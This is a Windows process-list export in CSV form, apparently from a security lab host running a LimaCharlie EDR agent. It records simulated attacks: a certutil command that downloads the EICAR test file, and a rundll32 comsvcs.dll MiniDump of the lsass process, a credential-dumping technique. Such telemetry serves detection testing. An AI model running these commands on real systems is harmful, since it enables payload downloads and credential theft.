"ProcessId","ParentProcessId","Name","CommandLine","CreationDate"
"0","0","System Idle Process","","20260922080000.000000+000"
"4","0","System","","20260922080000.000000+000"
"388","4","smss.exe","\SystemRoot\System32\smss.exe","20260922080001.120000+000"
"540","528","csrss.exe","%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768","20260922080002.340000+000"
"628","528","wininit.exe","wininit.exe","20260922080002.510000+000"
"684","628","services.exe","C:\Windows\system32\services.exe","20260922080003.010000+000"
"748","628","lsass.exe","C:\Windows\system32\lsass.exe","20260922080003.110000+000"
"1044","684","svchost.exe","C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache","20260922080004.220000+000"
"2140","684","rphcp.exe","C:\Program Files\LimaCharlie\rphcp.exe","20260922080110.450000+000"
"2840","2710","explorer.exe","C:\Windows\Explorer.EXE","20260922080215.890000+000"
"3812","2840","cmd.exe","""C:\Windows\System32\cmd.exe""","20260922154155.100000+000"
"4928","3812","certutil.exe","certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com C:\LabAttacks\payload_certutil.tmp","20260922154210.350000+000"
"3912","2840","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""","20260922161420.210000+000"
"5840","3912","rundll32.exe","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 748 C:\LabAttacks\lsass_simulated.dmp full","20260922161502.880000+000"
